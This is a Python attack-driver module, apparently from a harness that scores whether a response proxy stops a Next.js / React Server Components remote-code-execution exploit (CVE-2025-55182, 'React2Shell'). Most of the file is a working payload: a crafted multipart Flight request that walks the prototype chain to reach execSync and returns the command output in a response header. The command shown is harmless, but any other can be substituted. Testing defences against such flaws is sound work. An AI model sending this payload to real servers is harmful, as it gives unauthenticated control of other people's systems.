"""Attack driver for React Server Components / Next.js CVE-2025-55182
("React2Shell"): an unauthenticated RCE in the RSC Flight-protocol
deserialization. A crafted multipart Server-Function request walks the
prototype chain and executes a command on the server; the command's stdout is
returned to the attacker inside the response's `x-action-redirect` header
(via a thrown NEXT_REDIRECT whose digest embeds the output).

The payload shape is the public Vulhub / lachlan2k PoC. Here the command both
touches a marker file (independent state oracle, checked via `docker exec`) and
runs `id` (whose `uid=...` output is the response-side evidence). That lets the
scoreboard separate "the backend executed the command" from "the proof reached
the attacker": in-band evidence a response proxy can withhold, execution it
cannot undo.

The attack runs from the VM host, like a real external attacker; the target is
the vulnerable Next.js 15.5.6 container.
"""
from __future__ import annotations

import re

from .common import HTTPResult, RunOutcome, http_request

UID_RE = re.compile(r"uid=\d+\([a-z0-9_-]+\)")
_BOUNDARY = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"


def _command(marker: str) -> str:
    # Runs in a shell on the server. Touch the marker (state oracle) and echo id
    # (the uid=... output becomes the response-header evidence).
    return f"touch {marker}; id"


def _part0(marker: str) -> str:
    # The malicious Flight record. `_prefix` is JS evaluated during decode; it
    # runs the command and throws a NEXT_REDIRECT carrying the output.
    cmd = _command(marker).replace("\\", "\\\\").replace("'", "\\'")
    prefix = (
        "var res=process.mainModule.require('child_process')"
        f".execSync('{cmd}').toString().trim();;"
        "throw Object.assign(new Error('NEXT_REDIRECT'),"
        "{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"
    )
    # Build the JSON by hand so the embedded prefix string is escaped exactly once.
    prefix_json = prefix.replace("\\", "\\\\").replace('"', '\\"')
    return (
        '{\n'
        '  "then": "$1:__proto__:then",\n'
        '  "status": "resolved_model",\n'
        '  "reason": -1,\n'
        '  "value": "{\\"then\\":\\"$B1337\\"}",\n'
        '  "_response": {\n'
        f'    "_prefix": "{prefix_json}",\n'
        '    "_chunks": "$Q2",\n'
        '    "_formData": {\n'
        '      "get": "$1:constructor:constructor"\n'
        '    }\n'
        '  }\n'
        '}'
    )


def _body(marker: str) -> str:
    b = _BOUNDARY
    return (
        f"--{b}\r\n"
        'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{_part0(marker)}\r\n"
        f"--{b}\r\n"
        'Content-Disposition: form-data; name="1"\r\n\r\n'
        '"$@0"\r\n'
        f"--{b}\r\n"
        'Content-Disposition: form-data; name="2"\r\n\r\n'
        "[]\r\n"
        f"--{b}--\r\n"
    )


def attack(base: str, marker: str, echo: bool = True) -> tuple[bool, int, list]:
    """Run the exploit once. Returns (evidence_seen_by_attacker, requests, transcript).

    `echo=False` runs the same RCE but the scoreboard ignores the in-band header,
    modelling a blind command (state oracle only) — the honest ceiling control.
    """
    headers = {
        "Next-Action": "x",
        "Content-Type": f"multipart/form-data; boundary={_BOUNDARY}",
    }
    r: HTTPResult = http_request(base, "POST", "/", headers, _body(marker))
    # The command output lands in the x-action-redirect response header.
    seen = bool(UID_RE.search(r.text()))
    leaked = seen and echo
    transcript = [{
        "req": "POST / (RSC Server Function)", "status": r.status,
        "leaked": leaked,
        "redirect": (r.headers.get("x-action-redirect") or r.headers.get("X-Action-Redirect") or "")[:200],
    }]
    return leaked, 1, transcript


def run(base: str, marker: str, echo: bool, check_state, reset_state) -> RunOutcome:
    reset_state()
    out = RunOutcome()
    leaked, reqs, transcript = attack(base, marker, echo)
    out.evidence_leaked = leaked
    out.requests = reqs
    out.transcript = transcript
    out.backend_executed = check_state()
    out.blocked_pre_exec = (not out.backend_executed) and (not leaked)
    return out
